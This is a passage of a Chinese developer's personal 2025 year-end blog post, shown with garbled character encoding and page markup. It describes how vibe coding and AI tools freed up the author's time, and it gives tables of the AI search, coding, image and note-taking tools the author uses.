                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ <strong>ä¸€ç‚¹ä¸€æœ¨</strong>ã€‚åœ¨æˆ‘çš„ 2025 å¹´ç»ˆæ€»ç»“é‡Œï¼Œæˆ‘åˆ†æˆäº†ä¸¤ç¯‡ï¼šç¬¬ä¸€ç¯‡æ›´ä¸“æ³¨æŠ€æœ¯ï¼š<a href="https://juejin.cn/post/7592119218029166626" target="_blank" title="https://juejin.cn/post/7592119218029166626">ã€Š2025 å¹´ç»ˆæŠ€æœ¯å¤ç›˜ï¼šä»ä¼ ç»Ÿç¼–ç¨‹åˆ° Vibe Coding çš„å·¥ä½œæµè·ƒè¿ã€‹</a>ï¼›ç¬¬äºŒç¯‡æ›´ç§äººåŒ–ï¼šä¹Ÿå°±æ˜¯è¿™ç¯‡ã€‚ä½†æˆ‘ä¸æƒ³å†™æˆçº¯ç”Ÿæ´»æ—¥è®°ã€‚ç”Ÿæ´»å’Œå·¥ä½œåœ¨æˆ‘çœ‹æ¥éœ€è¦åˆ†å¼€ï¼Œè€Œä¸”å¦ç™½è¯´ï¼Œå¤§å®¶ä¹Ÿä¸å…³å¿ƒä¸€ä¸ªé™Œç”Ÿäººçš„æ—¥å¸¸å…·ä½“æ€ä¹ˆæ ·ã€‚æˆ‘æ›´æƒ³åˆ†äº«çš„æ˜¯ï¼š<strong>è¿™äº›å˜åŒ–å¯¹æˆ‘æœ‰ç”¨ï¼Œä¹Ÿå¸Œæœ›å¯¹ä½ æœ‰ç”¨</strong>ã€‚è¿™ç¯‡çš„ä¸­å¿ƒåªæœ‰ä¸€å¥è¯ï¼š</p>
<blockquote>
<p><code>AI</code> ææ•ˆä¸æ˜¯ä¸ºäº†æ›´å·ï¼Œè€Œæ˜¯ä¸ºäº†æŠŠæ—¶é—´è¿˜ç»™è‡ªå·±ã€‚</p>
</blockquote>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e1d6ab888274a2b927ea5e870eab0a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769012930&amp;x-signature=7hR0hLbyDZtY3mkP4tRlsZ2JnPE%3D" alt="sskwKoKoqaC1sQgf3oJxW" loading="lazy"/></p>
<p>å›æƒ³å¹´åˆï¼Œæˆ‘è¿˜æ˜¯é‚£ä¸ªç¤¾ç•œå¼å¼€å‘è€…ï¼šå·¥ä½œå  80% æ—¶é—´ï¼Œå‰©ä¸‹ 20% ç”¨æ¥æ‹…å¿ƒã€Œ<code>AI</code> ä¼šä¸ä¼šå–ä»£æˆ‘ã€ã€‚ä½† <code>Vibe Coding</code> æ”¹å˜äº†è¿™ä¸€åˆ‡ã€‚å®ƒä¸æ˜¯ä»€ä¹ˆé«˜å¤§ä¸Šçš„æ¦‚å¿µï¼Œå°±æ˜¯ç”¨è‡ªç„¶è¯­è¨€æŠŠæƒ³æ³•æ¨åˆ°å¯è¿è¡Œçš„ä¸œè¥¿ã€‚æ¯”å¦‚ï¼Œç”¨ <code>Claude</code> æˆ–è±†åŒ…ï¼Œå‡ å¥æè¿°å°±èƒ½ç”Ÿæˆä»£ç è‰ç¨¿ï¼›å†ç”¨ <code>Cursor</code> è¿­ä»£ï¼ŒåŸå‹å°±å‡ºæ¥äº†ã€‚è¿™è®©æˆ‘åœ¨å·¥ä½œä¸­çœä¸‹å¤§é‡è°ƒè¯•æ—¶é—´â€”â€”ä»¥å‰ä¿®ä¸ª <code>bug</code> å¯èƒ½å¡åŠå¤©ï¼Œç°åœ¨ <code>AI</code> å¸®æˆ‘æ¨¡æ‹Ÿåœºæ™¯ï¼Œæ•ˆç‡è‡³å°‘æå‡ 30%ã€‚</p>
<p>æ›´æœ‰æ„æ€çš„æ˜¯ï¼Œè¿™ç§ææ•ˆä¸æ˜¯å•å‘çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªé—­ç¯ï¼š</p>
<blockquote>
<p><strong>å·¥ä½œæ›´å¿« â†’ æœ‰ç²¾åŠ›å­¦æ–°ä¸œè¥¿ â†’ å­¦åˆ°çš„æ–°ä¸œè¥¿åè¿‡æ¥ä¼˜åŒ–å·¥ä½œ â†’ ç»§ç»­å˜å¿«ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-0">å‘Šåˆ«å¿™ç¢Œçš„å‡è±¡ï¼šæˆ‘çš„èƒ½é‡å®ˆæ’å®šå¾‹</h3>
<p>2025 å¹´æˆ‘æœ€æ˜æ˜¾çš„å˜åŒ–æ˜¯ï¼š<strong>æˆ‘ä¸å†æŠŠæ‰€æœ‰æ—¶é—´éƒ½å¡è¿›å·¥ä½œä¸­ã€‚</strong></p>
<p>è¿™å¬èµ·æ¥æœ‰ç‚¹å‡¡å°”èµ›ï¼Œä½†æœ¬è´¨ä¸Šæ˜¯ <strong><code>AI</code> ææ•ˆåçš„çº¢åˆ©åˆ†é…é—®é¢˜</strong>ã€‚å¾—ç›Šäº <code>Vibe Coding</code> å’Œ <code>AI</code> å·¥å…·é“¾çš„æ·±åº¦èåˆï¼Œæˆ‘å®ŒæˆåŒæ ·è´¨é‡çš„å·¥ä½œæ‰€èŠ±çš„æ—¶é—´å¤§å¹…ç¼©å‡ã€‚æˆ‘æ²¡æœ‰é€‰æ‹©ç”¨çœä¸‹æ¥çš„æ—¶é—´å»æ¥æ›´å¤šçš„æ´»ï¼Œè€Œæ˜¯æŠŠå®ƒä»¬æŠ•å…¥åˆ°äº†<strong>ä¿¡å·æ•æ‰</strong>å’Œ<strong>è‡ªæˆ‘è¿­ä»£</strong>ä¸­ã€‚</p>
<p><strong>æˆ‘çš„é€»è¾‘å¾ˆç®€å•ï¼š</strong></p>
<ul>
<li><strong><code>AI</code> è´Ÿè´£æ‰§è¡Œï¼š</strong> çç¢çš„ä»£ç å®ç°ã€æ–‡ç« é…å›¾ã€æ•°æ®æ¸…æ´—äº¤ç»™ <code>AI</code>ã€‚</li>
</ul>

<ul>
<li><strong>æˆ‘è´Ÿè´£å†³ç­–ä¸é“¾æ¥ï¼š</strong> åˆ¤æ–­å“ªä¸ªä¿¡å·å€¼å¾—è¿½ã€å‚åŠ ä»€ä¹ˆæ´»åŠ¨ã€æ€ä¹ˆæŠŠå­¦åˆ°çš„ä¸œè¥¿å†™æˆæ–‡ç« ã€ç¤¾åŒºäº’åŠ¨ã€å­¦ä¹ å’Œä½¿ç”¨ <code>AI</code> ç›¸å…³çš„å†…å®¹ç­‰ç­‰ã€‚</li>
</ul>
<p>è¿™ç§ç›¸è¾…ç›¸æˆçš„çŠ¶æ€ï¼Œè®©æˆ‘ç»ˆäºä»ã€Œå·¥ä½œ-ç–²æƒ«-ä¼‘æ¯-ç„¦è™‘ã€çš„æ­»å¾ªç¯ï¼Œè¿›å…¥äº†ã€Œå­¦ä¹ -å®è·µ-äº§å‡º-æ­£åé¦ˆã€çš„èºæ—‹ä¸Šå‡ã€‚</p>
<hr/>
<h3 data-id="heading-1">åˆ›ä½œè€…å¿ƒæ€ï¼šçœ‹åˆ°ä¿¡å·ï¼Œç«‹åˆ»è¡ŒåŠ¨</h3>
<p>2025 å¹´æˆ‘è¿˜åˆ»æ„è®­ç»ƒäº†ä¸€ä»¶äº‹ï¼š<strong>æŠŠçµæ„Ÿå½“æˆä»»åŠ¡ï¼ŒæŠŠæƒ³æ³•å˜æˆäº¤ä»˜</strong>ã€‚</p>
<p>ä»¥å‰çœ‹åˆ°ä¸€ä¸ªæ–°æŠ€æœ¯ï¼Œæˆ‘è„‘å­é‡Œç¬¬ä¸€ååº”æ˜¯ï¼šã€Œæˆ‘è¦ä¸è¦å­¦ä¸€ä¸‹ï¼Ÿç¯å¢ƒå¥½éš¾æ­ï¼Œç­‰ä»¥åæœ‰æ—¶é—´å†è¯´ã€‚ã€ç°åœ¨æˆ‘çš„è·¯å¾„æ›´çŸ­ï¼Œä¹Ÿæ›´ç°å®ï¼šï¼š<strong>çœ‹åˆ°ä¿¡å· -&gt; ç”¨ <code>Trae</code> / <code>Cursor</code> å¿«é€Ÿæ­ä¸ª <code>Demo</code> -&gt; åœ¨ <code>Obsidian</code> å¿«é€Ÿè®°ä¸‹æ ¸å¿ƒé€»è¾‘ -&gt; å‘åˆ°ç¤¾åŒºå¹³å°çœ‹çœ‹åé¦ˆã€‚</strong></p>
<p><code>Vibe Coding</code> å¯¹æˆ‘æœ€å¤§çš„æ”¹å˜ä¸æ˜¯å†™ä»£ç æ›´å¿«ï¼Œè€Œæ˜¯ï¼š<strong>è®©æ‰§è¡Œå˜å¾—æå…¶ä¾¿å®œ</strong>ã€‚å½“ä½ èƒ½åœ¨å¾ˆçŸ­æ—¶é—´å†…åšå‡ºä¸€ä¸ªå¯å±•ç¤ºçš„ç‰ˆæœ¬ï¼Œä½ å°±ä¸ä¼šå†è¢«<strong>å‡†å¤‡æˆæœ¬</strong>åŠé€€ï¼›è€Œå½“ä½ å¼€å§‹æŠŠè¾“å‡ºäº¤ç»™åé¦ˆå»æ ¡å‡†ï¼Œå­¦ä¹ å°±ä¸å†æ˜¯å­¤ç«‹çš„è‡ªå—¨ï¼Œè€Œæ˜¯å¸¦æ–¹å‘ã€å¸¦å¤åˆ©çš„æˆé•¿ã€‚</p>
<hr/>
<h3 data-id="heading-2"><code>AI</code> å…¨æ ˆå·¥å…·åœ°å›¾</h3>
<p>ä¸ºäº†ç»´æŒè¿™å¥—æµæ°´çº¿çš„é«˜æ•ˆè¿è½¬ï¼Œæˆ‘æ·±åº¦ä½“éªŒå¹¶ç­›é€‰äº†ä¸€å¥—å·¥å…·çŸ©é˜µã€‚è¿™é‡Œåˆ†äº«ç»™å¤§å®¶ï¼Œå¸Œæœ›èƒ½å¸®å¤§å®¶èŠ‚çœç­›é€‰æ—¶é—´ï¼š</p>
<h4 data-id="heading-3">1.ä¿¡æ¯çŒæ‰‹å±‚ï¼šæƒ…æŠ¥è·å–ä¸çœŸä¼ªéªŒè¯</h4>
<p><strong>é€»è¾‘ï¼š</strong> åœ¨ <code>AI</code> æ—¶ä»£ï¼Œ<strong>ä¿¡æºçš„ç¡®å®šæ€§</strong>æ¯”è·å–é€Ÿåº¦æ›´é‡è¦ã€‚</p>





























<table><thead><tr><th>æ ¸å¿ƒå·¥å…·</th><th>å®šä½</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>ç§˜å¡”<code>AI</code>æœç´¢ / <code>Perplexity</code></td><td>ä¸»åŠ›</td><td>å®æ—¶æœç´¢ã€ä¿¡æºè¿½è¸ªã€è¦ç‚¹æç‚¼</td><td>ç”¨ç§˜å¡”æ‹‰å‡ºå…³é”®è¯åœ°å›¾æ‰«ç›²ï¼Œç”¨ <code>Perplexity</code> è¿›è¡Œå¤šæºäº¤å‰éªŒè¯ï¼Œå½»åº•æœç» <code>AI</code> å¹»è§‰ã€‚</td></tr><tr><td><code>V2EX</code> / <code>HN</code> / <code>Lobsters</code></td><td>å…¨çƒä¿¡å·æº</td><td>è¶‹åŠ¿æ•æ‰ã€æŠ€æœ¯é»‘è¯ã€çœŸå®æ§½ç‚¹æ´å¯Ÿ</td><td>æ¯å¤©åˆ· <code>HN</code> æŠ“å…¨çƒé£å‘ï¼Œåœ¨ <code>V2EX</code> ç¿»çœ‹çœŸå®ç¯å¢ƒä¸‹çš„è¸©å‘è®¨è®ºã€‚</td></tr><tr><td><code>DEV</code> / æ˜é‡‘ / <code>CSDN</code></td><td>ä¸­æ–‡ä¿¡å·æº</td><td>å®è·µæ•™ç¨‹ã€æŠ€æœ¯çƒ­ç‚¹åé¦ˆ</td><td>å¯»æ‰¾è½åœ°å‹æ•™ç¨‹ï¼Œè§‚å¯Ÿå›½å†…å¼€å‘è€…çš„çœŸå®ç—›ç‚¹å’Œä¸šåŠ¡åº”ç”¨åœºæ™¯ã€‚</td></tr></tbody></table>
<h4 data-id="heading-4">2.å¤§è„‘å¤–æŒ‚å±‚ï¼šæ·±åº¦æ¨ç†ä¸åˆ›ä½œæ€è€ƒ</h4>
<p><strong>é€»è¾‘ï¼š</strong> æ—¢ç„¶æ˜¯ <code>Vibe Coding</code>ï¼Œå°±è¦æŠŠæœ€æ¯ç‡¥çš„é€»è¾‘ç»„ç»‡äº¤ç»™æœ€å¼ºçš„æ¨¡å‹ï¼Œäººè´Ÿè´£æ‹ç –å†³ç­–ã€‚</p>









































<table><thead><tr><th>æ ¸å¿ƒå·¥å…·</th><th>å®šä½</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td><code>Claude</code> (+ <code>Claude Code</code>)</td><td>ä¸»åŠ›</td><td>é•¿ä¸Šä¸‹æ–‡ã€ä»£ç é‡æ„ã€é€»è¾‘å¯¹é½</td><td><strong>å¹´åº¦æœ€ä½³æŸå‹ï¼š</strong> é€»è¾‘æå…¶ä¸¥å¯†ï¼Œæœ€é€‚åˆåŠå¤œå†™é•¿æ–‡æˆ–ä¿®å¤æ‚ <code>Bug</code> æ—¶çš„æ·±åº¦é™ªè·‘ã€‚</td></tr><tr><td><code>ChatGPT</code> / <code>Gemini</code> / <code>DeepSeek</code></td><td>ä¸»åŠ›</td><td>é€šç”¨å¯¹è¯ã€å¤šæ¨¡å‹äº¤å‰å¯¹ç…§</td><td>åŒæ ·çš„é—®é¢˜ä¸¢ç»™ä¸åŒæ¨¡å‹ï¼Œå–é•¿è¡¥çŸ­ï¼Œå¯¹æ¯”ä¸åŒæ¨¡å‹çš„æ¨ç†è·¯å¾„ã€‚</td></tr><tr><td>è±†åŒ… / åƒé—® (<code>Qwen</code>)</td><td>å¤‡é€‰</td><td>ä¸­æ–‡è¯­å¢ƒã€æ¥åœ°æ°”è¡¨è¾¾</td><td>ä¸“é—¨ç”¨äºå¾®è°ƒä¸­æ–‡è¯­æ„Ÿï¼ŒæŠŠ <code>AI</code> è…”è°ƒè½¬åŒ–ä¸ºæ›´å…·æ„ŸæŸ“åŠ›çš„æŠ€æœ¯éšç¬”ã€‚</td></tr><tr><td><code>Grok</code></td><td>è¯•éªŒ</td><td>å¹½é»˜å¯¹è¯ã€è„‘æ´ç¢°æ’</td><td>çµæ„Ÿæ¯ç«­æ—¶å»å’Œå®ƒäº’æ€¼ï¼Œå¾€å¾€èƒ½è¹¦å‡ºæ„æƒ³ä¸åˆ°çš„é€‰é¢˜é‡‘å¥æˆ–æ¯’èˆŒè§†è§’ã€‚</td></tr><tr><td>æ²‰æµ¸å¼ç¿»è¯‘</td><td>è¾…åŠ©</td><td>æœ¯è¯­ç»Ÿä¸€ã€åŒè¯­å¯¹ç…§æ¶ˆåŒ–</td><td>å…¨é€Ÿæ¶ˆåŒ– <code>GitHub</code> æ–‡æ¡£å’Œè‹±æ–‡é•¿æ¨ï¼Œä¿æŒå…¨çƒä¿¡æ¯åŒæ­¥é›¶æ—¶å·®ã€‚</td></tr></tbody></table>
<h4 data-id="heading-5">3.ç”Ÿäº§åŠ›ä¸­å¿ƒå±‚ï¼šä»£ç å·¥ç¨‹ä¸è‡ªåŠ¨åŒ–</h4>
<p><strong>é€»è¾‘ï¼š</strong> å°†æƒ³æ³•è½¬åŒ–ä¸ºç°å®çš„åŠ é€Ÿå™¨ã€‚</p>



































<table><thead><tr><th>æ ¸å¿ƒå·¥å…·</th><th>å®šä½</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td><code>Trae</code> / <code>Cursor</code></td><td>ä¸»åŠ›</td><td><code>AI</code> é©±åŠ¨ <code>IDE</code>ã€<code>Builder</code> æ¨¡å¼</td><td><strong>æ ¸å¿ƒç”Ÿäº§åŠ›ï¼š</strong> ç”¨ <code>Trae</code> è‡ªåŠ¨æ‹†è§£ä»»åŠ¡ï¼Œæˆ‘åªè´Ÿè´£å…³é”®èŠ‚ç‚¹å®¡è®¡ï¼Œå®ç° 80% ä»£ç å…å†™ã€‚</td></tr><tr><td><code>Google Antigravity</code></td><td>é«˜é˜¶</td><td><code>Agent</code> ç¼–æ’ã€è‡ªä¸»æ‰§è¡Œä¸éªŒè¯</td><td><strong>ä»ç¨‹åºå‘˜å‡çº§ä¸ºæŒ‡æŒ¥å®˜ï¼š</strong> å¼€å¯ <code>Mission Control</code> æ¨¡å¼ï¼Œè®©å¤šä¸ª <code>Agent</code> å¹¶è¡Œå¤„ç†å‰åç«¯ä»»åŠ¡ã€‚</td></tr><tr><td><code>n8n</code> / <code>Dify</code> / <code>Coze</code></td><td>ä¸»åŠ›</td><td>å·¥ä½œæµç¼–æ’ã€<code>Agent</code> è‡ªåŠ¨åŒ–</td><td>åªè¦ä¸€ä¸ªæµç¨‹é‡å¤ 3 æ¬¡ï¼Œå°±æ­æˆè‡ªåŠ¨åŒ–å·¥å‚ï¼ŒæŠŠç¢ç¢å¿µçš„éœ€æ±‚å˜æˆæ ‡å‡†äº§çº¿ã€‚</td></tr><tr><td><code>Ollama</code> / <code>OpenRouter</code></td><td>å¤‡é€‰</td><td>æœ¬åœ°æ¨ç†ä¸æ¨¡å‹è·¯ç”±åˆ‡æ¢</td><td>æ•æ„Ÿä»£ç è·‘ <code>Ollama</code>ï¼›é€šè¿‡ <code>OpenRouter</code> ä¸€é”®åˆ‡æ¢æœ€æ–°å‘å¸ƒçš„å„ç§å¤§æ¨¡å‹ã€‚</td></tr></tbody></table>
<h4 data-id="heading-6">4.è§†è§‰è‰ºæœ¯å±‚ï¼šé«˜è´¨é‡å†…å®¹ç¾åŒ–</h4>
<p><strong>é€»è¾‘ï¼š</strong> å¥½çš„æŠ€æœ¯æ–‡ç« éœ€è¦é¡¶çº§çš„è§†è§‰èµ„äº§æ¥è¾…åŠ©è¡¨è¾¾ã€‚</p>





























<table><thead><tr><th>æ ¸å¿ƒå·¥å…·</th><th>å®šä½</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>è±†åŒ…å›¾åƒåˆ›ä½œæ¨¡å‹ 4/4.5</td><td>ä¸»åŠ›</td><td>é«˜ç¨³å®šä¸­æ–‡ç†è§£ã€é£æ ¼ä¸€è‡´æ€§</td><td><strong>å¤´å·ç”»å¸ˆï¼š</strong> æœ¬å¹´æ‰€æœ‰æ–‡ç« å°é¢å’Œä½œå“ <code>UI</code> å‡ ä¹å…¨ç”±å®ƒæ‰¿è½½ï¼Œä¸­æ–‡ <code>Prompt</code> æåº¦å‹å¥½ã€‚</td></tr><tr><td>å³æ¢¦ <code>AI</code> / <code>Sora</code> / <code>MJ</code></td><td>å¤‡é€‰</td><td>è§†é¢‘ç”Ÿæˆä¸é¡¶å°–è‰ºæœ¯é£æ ¼</td><td>æ¼”è®²æ—¶çš„åŠ¨æ€æ¼”ç¤ºç”¨å³æ¢¦ï¼›éœ€è¦ç”µå½±çº§è§†è§‰è´¨æ„Ÿæ—¶å¬å”¤ <code>Midjourney</code>ã€‚</td></tr><tr><td><code>Nano Banana</code></td><td>è¯•éªŒ</td><td>èŠå¤©å¼å›¾åƒç¼–è¾‘</td><td><strong>å¯¹è¯å³ä¿®å›¾ï¼š</strong> åƒèŠå¤©ä¸€æ ·å¾®è°ƒå›¾åƒå±€éƒ¨ï¼Œä¸éœ€è¦å¤æ‚çš„å‚æ•°ï¼Œè°ƒæ•´ç»†èŠ‚éå¸¸é¡ºæ‰‹ã€‚</td></tr></tbody></table>
<h4 data-id="heading-7">5.æ•°å­—åŒ–åº•åº§ï¼šæ•°æ®æ‰¿è½½ä¸çŸ¥è¯†æ²‰æ·€</h4>
<p><strong>é€»è¾‘ï¼š</strong> æ‰€æœ‰çš„è¾“å‡ºå¿…é¡»æœ‰è¿¹å¯å¾ªï¼Œæ„å»ºå¯æ£€ç´¢çš„ã€Œç¬¬äºŒå¤§è„‘ã€ã€‚</p>





























<table><thead><tr><th>æ ¸å¿ƒå·¥å…·</th><th>å®šä½</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>é£ä¹¦å¤šç»´è¡¨æ ¼</td><td>ä¸»åŠ›</td><td>ç»“æ„åŒ–å­˜å‚¨ã€é€‰é¢˜/æ•°æ®ä»“åº“</td><td><strong>ä¹±ä¸ƒå…«ç³Ÿç»ˆç‚¹ç«™ï¼š</strong> æ‰€æœ‰ <code>Workflow</code> è·‘å‡ºæ¥çš„åŸå§‹ç´ æå’Œå‘æ–‡è®¡åˆ’å…¨è½åœ¨è¿™é‡Œã€‚</td></tr><tr><td><code>Typora</code> / <code>Obsidian</code></td><td>ä¸»åŠ›</td><td>æ²‰æµ¸å¼å†™ä½œä¸åŒé“¾çŸ¥è¯†åº“</td><td><code>Typora</code> è´Ÿè´£è½»é‡åŒ–çš„è‰ç¨¿è¾“å‡ºï¼Œ<code>Obsidian</code> è´Ÿè´£æ„å»ºé•¿æœŸçš„çŸ¥è¯†å›¾è°±ã€‚</td></tr><tr><td><code>PyTorch</code> / <code>TensorFlow</code></td><td>å­¦ä¹ </td><td>åº•å±‚æ¡†æ¶æ·±åº¦å­¦ä¹ </td><td><strong>ç¡¬æ ¸ç»„ï¼š</strong> å³ä½¿ <code>AI</code> å†å¼ºï¼Œä¹Ÿè¦é€šè¿‡è¿™äº›æ¡†æ¶ç†è§£ç¥ç»ç½‘ç»œçš„é»‘ç›’é€»è¾‘ã€‚</td></tr></tbody></table>
<h4 data-id="heading-8">æ€»ç»“ä¸åˆ†æï¼šæˆ‘çš„å·¥å…·å“²å­¦</h4>
<p>é€šè¿‡è¿™ä¸€å¹´çš„é«˜å¼ºåº¦ä½¿ç”¨ï¼Œæˆ‘æ€»ç»“äº†ä¸‰æ¡<strong>å·¥å…·ä½¿ç”¨å®ˆåˆ™</strong>ï¼Œä¹Ÿåˆ†äº«ç»™å¤§å®¶ï¼š</p>
<ol>
<li><strong>ä¸è¦åšå·¥å…·çš„æ¬è¿å·¥ï¼Œè¦åšæµç¨‹çš„å»ºç­‘å¸ˆ</strong>ï¼š å·¥å…·æœ¬èº«ä¸å€¼é’±ï¼Œå€¼é’±çš„æ˜¯ä½ å¦‚ä½•ç”¨ <code>n8n</code> æˆ– <code>Coze</code> å°†å®ƒä»¬ä¸²è”èµ·æ¥ã€‚</li>
<li><strong>å¤šæ¨¡å‹äº¤å‰éªŒè¯ (<code>Cross-Check</code>) æ˜¯æ¶ˆé™¤å¹»è§‰çš„å”¯ä¸€å‡ºè·¯</strong>ï¼š æ°¸è¿œä¸è¦è¿·ä¿¡æŸä¸€ä¸ªæ¨¡å‹ã€‚æˆ‘çš„ä¹ æƒ¯æ˜¯ï¼š<code>Claude</code> å†™é€»è¾‘ï¼Œç§˜å¡”æŸ¥äº‹å®ï¼Œè±†åŒ…è°ƒè¯­æ„Ÿã€‚åœ¨å…³é”®å†³ç­–ä¸Šï¼Œè‡³å°‘è¦è¿‡ä¸‰ä¸ªæ¨¡å‹ã€‚</li>
<li><strong>æ²‰æ·€å¤§äºäº§å‡º</strong>ï¼š å¦‚æœæ²¡æœ‰é£ä¹¦å¤šç»´è¡¨æ ¼å’Œ <code>Obsidian</code> çš„æ²‰æ·€ï¼Œè¿™äº›å·¥å…·åªä¼šè®©ä½ å˜å¾—å¿™ç¢Œè€Œä¸æ˜¯æˆé•¿ã€‚æ‰€æœ‰çš„ <code>AI</code> äº§å‡ºï¼Œå¿…é¡»è½å…¥ä½ è‡ªå·±çš„æ•°æ®åº“ï¼Œæ‰èƒ½å˜æˆä½ çš„ç¬¬äºŒå¤§è„‘ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-9">é—ªå…‰ç¬é—´ï¼šä»å±å¹•åèµ°å‘è®²å°</h3>
<p>2025 å¹´å¯¹æˆ‘æ¥è¯´ï¼Œä¸€ä¸ªå¾ˆå…·è±¡çš„å˜åŒ–æ˜¯ï¼š<strong>æˆ‘å¼€å§‹ä»å±å¹•åèµ°å‘è®²å°</strong>ã€‚</p>
<p>å¦‚æœè¯´è¿‡å»çš„æˆé•¿æ›´å¤šå‘ç”Ÿåœ¨æˆ‘å’Œä»£ç çš„ä¸–ç•Œé‡Œï¼Œé‚£ä¹ˆä»Šå¹´ï¼Œæˆ‘é€šè¿‡ <strong>å››æ¬¡é‡è¦æ´»åŠ¨</strong>å’Œ<strong>ä¸¤æ¬¡æ¼”è®²</strong>ï¼Œç¬¬ä¸€æ¬¡å®Œæ•´ç»å†äº†åˆ›ä½œè€…è·¯å¾„çš„å¦ä¸€åŠï¼š<strong>è¾“å‡º â†’ è¢«çœ‹è§ â†’ è·å¾—åé¦ˆ â†’ åè¿‡æ¥é€¼è‡ªå·±æ›´æ¸…æ™°</strong>ã€‚</p>
